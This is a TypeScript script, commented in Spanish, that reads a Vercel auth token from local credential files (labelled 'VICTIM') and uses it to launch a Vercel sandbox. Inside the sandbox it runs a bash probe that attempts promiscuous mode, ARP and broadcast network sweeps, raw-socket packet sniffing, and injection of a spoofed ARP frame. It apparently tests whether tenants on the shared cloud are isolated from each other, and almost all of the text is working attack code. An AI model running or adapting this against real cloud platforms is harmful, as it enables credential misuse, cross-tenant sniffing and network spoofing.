import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";

const SCRIPT = `
set +e
echo "=== 1. capaz de promiscuous mode? ==="
ip link set eth0 promisc on 2>&1 && echo "PROMISC OK" || echo "PROMISC FAIL (permiso)"
ip link show eth0 2>/dev/null | head -1
echo ""
echo "=== 2. hay tcpdump disponibles? ==="
which tcpdump tshark 2>/dev/null
echo ""
echo "=== 3. broadcast ARP: quien responde? ==="
timeout 3 arping -c 2 -B -I eth0 100.64.255.255 2>/dev/null | head -5
echo "--- broadcast ping ---"
timeout 2 ping -c 1 -b 100.64.255.255 2>&1 | tail -2
echo ""
echo "=== 4. barrido ARP completo /16 (rapido, 10s) ==="
which arp-scan >/dev/null 2>&1 && timeout 8 arp-scan 100.64.0.0/16 --interface eth0 --timeout 200 2>/dev/null | head -15 || echo "no arp-scan"
echo "--- usando ip neigh tras ping broadcast ---"
ip neigh 2>/dev/null
echo ""
echo "=== 5. IPv6: neighbor discovery en fe80 ==="
ip -6 neigh 2>/dev/null
timeout 2 ping6 -c 1 ff02::1%eth0 2>/dev/null | head -2
echo ""
echo "=== 6. sniffer en bruto: capturar 3s de trafico y ver si hay MACs ajenas ==="
timeout 4 tcpdump -i eth0 -c 20 -nn 2>/dev/null | head -20 || timeout 4 python3 -c "
import socket, struct
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
s.bind(('eth0', 0))
s.settimeout(2)
try:
    for i in range(20):
        pkt, addr = s.recvfrom(2048)
        eth = pkt[:14]
        dst = ':'.join('%02x'%b for b in eth[0:6])
        src = ':'.join('%02x'%b for b in eth[6:12])
        etype = struct.unpack('>H', eth[12:14])[0]
        print('frame', i, 'src', src, 'dst', dst, 'type', hex(etype))
except socket.timeout:
    print('no frames en 2s (solo los nuestros)')
" 2>&1
echo ""
echo "=== 7. puedo inyectar frames con src MAC falsa (spoof)? ==="
timeout 3 python3 -c "
import socket, struct
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
s.bind(('eth0', 0))
# ARP request con MAC falsa para ver si el gateway responde a unicast falso
fake = b'\\x02\\x00\\x00\\x00\\x00\\x01'
arp = struct.pack('!HHBBH', 1, 0x0800, 6, 4, 1) + fake + socket.inet_aton('100.64.0.2') + b'\\x00\\x00\\x00\\x00\\x00\\x00' + socket.inet_aton('100.64.0.1')
frame = fake + fake + b'\\x08\\x06' + arp
s.send(frame)
print('ARP spoof frame enviado')
" 2>&1 | head -2
sleep 1
ip neigh 2>/dev/null | head -5
echo ""
echo "=== 8. ruta de mi gateway: cuantos saltos hasta internet ==="
echo "=== DONE ==="
`;

async function main() {
  const sbx = await Sandbox.create({
    name: "sniff-" + Date.now(),
    token: VICTIM, teamId, projectId,
    source: { type: "git", url: "https://github.com/vercel/sandbox-example-next.git" },
    ports: [3000],
  });
  const r = await sbx.runCommand("bash", ["-c", SCRIPT], { wait: true, timeout: 90_000 });
  const out = await r.output("both");
  console.log(out);
  console.log("DONE");
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });